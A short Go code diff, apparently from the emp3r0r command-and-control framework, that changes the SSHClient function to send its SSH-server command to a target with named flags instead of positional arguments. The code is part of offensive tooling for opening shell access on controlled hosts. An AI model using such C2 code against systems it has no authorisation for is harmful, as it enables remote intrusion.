@@ -93,7 +93,7 @@ func SSHClient(shell, args, port string, split bool) (err error) {
 		if args == "" {
 			args = "--"
 		}
-		cmd := fmt.Sprintf("%s %s %s %s", emp3r0r_data.C2CmdSSHD, shell, port, args)
+		cmd := fmt.Sprintf("%s --shell %s --port %s --args %s", emp3r0r_data.C2CmdSSHD, shell, port, args)
 		err = SendCmdToCurrentTarget(cmd, cmd_id)
 		if err != nil {
 			return
